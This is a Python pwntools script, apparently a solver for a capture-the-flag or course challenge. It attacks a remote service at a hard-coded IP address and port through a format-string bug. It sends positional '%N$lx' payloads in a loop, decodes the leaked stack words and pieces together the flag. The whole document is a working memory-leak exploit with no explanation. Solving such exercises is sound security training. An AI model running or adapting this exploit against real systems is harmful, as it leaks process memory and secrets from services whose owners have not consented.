from pwn import *
import re

# Connect to the remote service
host = '140.113.24.241'
port = 30172

flag = ''
count = 4
flag_on = 0

# Start the connection
#conn = remote(host, port)
#elf = ELF("./fmt")

def decode_hex_strings(response):
    # Split the response into words
    decoded_response = b''
    for hex_str in re.findall(r'[0-9a-fA-F]{16}', response):
        decoded_response += p64(int(hex_str, 16))
    return decoded_response

for i in range(1, 64): 
    payload = b"".join(
        [
            b"%" + str(i).encode() + b"$lx",
        ]
    )
    #remote case : 
    conn = remote(host, port)
    #local case :
    #conn = elf.process()

    conn.sendline(payload)
    response = conn.recvall().decode("latin-1")

    decoded_response = decode_hex_strings(response)
    if count == 0 :
        break
    if b'FLAG' in decoded_response:
        flag += decoded_response.decode()
        flag_on = 1
    elif flag_on == 1 and count > 0 :
        flag += decoded_response.decode()
        count-=1

    print(i)
    print(":")
    print(decoded_response)
    conn.close()

print(flag)